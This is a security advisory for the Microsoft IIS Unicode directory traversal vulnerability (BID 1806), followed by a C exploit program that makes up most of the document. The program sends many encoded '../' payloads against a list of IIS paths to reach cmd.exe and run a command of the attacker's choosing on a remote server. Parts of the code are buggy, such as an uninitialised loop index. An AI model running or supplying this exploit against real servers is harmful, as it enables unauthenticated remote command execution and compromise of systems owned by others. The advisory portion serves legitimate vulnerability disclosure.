source: http://www.securityfocus.com/bid/1806/info

Microsoft IIS 4.0 and 5.0 are both vulnerable to double dot "../" directory traversal exploitation if extended UNICODE character representations are used in substitution for "/" and "\". 

Unauthenticated users may access any known file in the context of the IUSR_machinename account. The IUSR_machinename account is a member of the Everyone and Users groups by default, therefore, any file on the same logical drive as any web-accessible file that is accessible to these groups can be deleted, modified, or executed. Successful exploitation would yield the same privileges as a user who could successfully log onto the system to a remote user possessing no credentials whatsoever.

It has been discovered that a Windows 98 host running Microsoft Personal Web Server is also subject to this vulnerability. (March 18, 2001)

This is the vulnerability exploited by the Code Blue Worm.

**UPDATE**: It is believed that an aggressive worm may be in the wild that actively exploits this vulnerability.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>

#define SEND	100000
#define RECIVE	1000000


char *str_replace(char *rep, char *orig, char *string)
{
int len=strlen(orig);
char buf[SEND]="";
char *pt=strstr(string,orig);

strncpy(buf,string, pt-string );
strcat(buf,rep);
strcat(buf,pt+strlen(orig));
strcpy(string,buf);
return string;
}

/***************************************************************************/

int main(int argc,char *argv[])
{
int sockfd, numbytes;
char recv_buf[RECIVE];
int i;
int port;


char *uni[]={
        "..%c0%af..",
        "..%c0%af../..%c0%af../..%c0%af..",
        "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..",

        "..%c1%1c..",
        "..%c1%1c../..%c1%1c../..%c1%1c..",
        "..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..",

        "..%252f..",
        "..%252f../..%252f../..%252f..",
        "..%252f..%252f..%252f..%252f..%252f..",

        "..%252e..",
        ".%252e..",
        "..%252e../..%252e../..%252e..",
        "..%252e..%252e..%252e..%252e..%252e..",

        "..%c0%9v..",
        "..%c0%9v../..%c0%9v../..%c0%9v..",
        "..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..",

        "..%c0%qf..",
        "..%c0%qf../..%c0%qf../..%c0%qf..",
        "..%c0%qf..%c0%qf..%c0%qf..%c0%qf..%c0%qf..",

	"..%c1%8s..",
        "..%c1%8s../..%c1%8s../..%c1%8s..",
        "..%c1%8s..%c1%8s..%c1%8s..%c1%8s..%c1%8s..",

        "..%c1%9c..",
        "..%c1%9c../..%c1%9c../..%c1%9c..",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..",

        "..%c1%pc..",
        "..%c1%pc../..%c1%pc../..%c1%pc..",
        "..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pc..",

        "..%255c..",
        "..%255c../..%255c../..%255c..",
        "..%255c..%255c..%255c..%255c..%255c..",

        "..%5c..",
        "..%5c../..%5c../..%5c..",
        "..%5c..%5c..%5c..%5c..%5c..",

        "..%%35c..",
        "..%%35c../..%%35c../..%%35c..",
        "..%%35c../..%%35c../..%%35c",		//last news
        "..%%35c..%%35c..%%35c..%%35c..%%35c..",

        "..%%35%63..",
        "..%%35%63../..%%35%63../..%%35%63..",
        "..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..",

        "..%25%35%63..",
        "..%25%35%63../..%25%35%63../..%25%35%63..",
        "..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63.."
};


char *path[]={
        "/scripts/#uni/winnt/system32/cmd.exe?/c+",
        "/scripts/#uniwinnt/system32/cmd.exe?/c+",
        "/msadc/#uni/winnt/system32/cmd.exe?/c+",
        "/cgi-bin/#uni/winnt/system32/cmd.exe?/c+",
        "/samples/#uni/winnt/system32/cmd.exe?/c+",
        "/iisadmpwd/#uni/winnt/system32/cmd.exe?/c+",
        "/_vti_cnf/#uni/winnt/system32/cmd.exe?/c+",
        "/_vti_bin/#uni/winnt/system32/cmd.exe?/c+",
        "/exchange/#uni/winnt/system32/cmd.exe?/c+",
        "/pbserver/#uni/winnt/system32/cmd.exe?/c+",
        "/adsamples/#uni/winnt/system32/cmd.exe?/c+"
};

int cont=0;

char send_buf[SEND]="";
int x,j;
int uni_len=sizeof(uni)/sizeof(char *);
int path_len=sizeof(path)/sizeof(char *);


struct hostent *he;

struct sockaddr_in their_addr;


if(argc!=4)
{
	fprintf(stderr,"usage:%s <hostname> <port> <commands>\n",argv[0]);
	exit(1);
}


if((he=gethostbyname(argv[1]))==NULL)
{
	perror("gethostbyname");
	exit(1);
}

port=atoi(argv[2]);


/***************************************************************************/

for(x=0;x<path_len;x++)
for(j=0;j<uni_len;j++)
{
sprintf(send_buf,"GET %s%s  HTTP/ 1.0\n\n", path[i],argv[3] );
str_replace(uni[j],"#uni",send_buf);

	if(cont==200) {
		sleep(3);
		cont=0;
	}
cont++;
sleep(1);
if( fork()!=0)
{

	if( (sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1)
	{
		perror("socket");
		exit(1);
	}


	their_addr.sin_family=AF_INET;
	their_addr.sin_port=htons(port);
	their_addr.sin_addr=*((struct in_addr*)he->h_addr);
	bzero(&(their_addr.sin_zero),8);



	if( connect(sockfd,(struct sockaddr*)&their_addr, sizeof(struct sockaddr))==-1)
	{
		perror("connect");
		exit(1);
	}

	if(send(sockfd,send_buf,SEND,0) ==-1)
	{
		perror("send");
		exit(0);
	}

	if( (numbytes=recv(sockfd,recv_buf,RECIVE,0 )) == -1)
	{
                perror("recv");
                exit(1);
	}
        recv_buf[numbytes]='\0';
        //printf("%s\n",recv_buf);

	if( (numbytes=recv(sockfd,recv_buf,RECIVE,0 )) == -1)
	{
                perror("recv");
                exit(1);
	}
        recv_buf[numbytes]='\0';
        printf("\n-----------------------------------------------\n");
        printf("String: %s\n\n",send_buf);
        printf("%s\n------------bytes recived: %d------------------\n",recv_buf,numbytes);




	close(sockfd);
	exit(0);
}

close(sockfd);
while(waitpid(-1,NULL, WNOHANG) > 0);
}


printf("Done...\n");
return 0;
}